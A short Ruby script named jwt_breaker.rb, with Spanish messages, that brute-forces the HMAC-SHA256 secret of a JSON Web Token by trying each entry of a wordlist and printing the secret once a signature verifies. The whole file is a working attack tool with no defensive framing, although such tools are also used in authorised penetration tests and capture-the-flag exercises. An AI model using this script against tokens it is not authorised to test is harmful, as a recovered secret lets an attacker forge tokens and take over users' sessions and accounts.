# gem install jwt
require 'jwt'

token, wordlist_path = ARGV

if ARGV.length < 2
  puts "Uso: ruby jwt_breaker.rb <token> <wordlist>"
  exit
end

puts "\e[34m[*] Brute Force JWT\e[0m"

File.foreach(wordlist_path) do |linea|
  secret = linea.strip
  begin
    JWT.decode(token, secret, true, { algorithm: 'HS256' })

    puts "\e[1;32m[+] SUCCESS | Secret: #{secret.ljust(20)} | JWT Validated!\e[0m"
    exit
  rescue JWT::VerificationError
    puts "[-] FAILED  | Secret: #{secret.ljust(20)} | Invalid Signature"
  rescue StandardError => e
    puts "[-] ERROR   | Secret: #{secret.ljust(20)} | #{e.message}"
    next
  end
end

puts "\n\e[31m[-] No se encontró el secreto en la wordlist.\e[0m"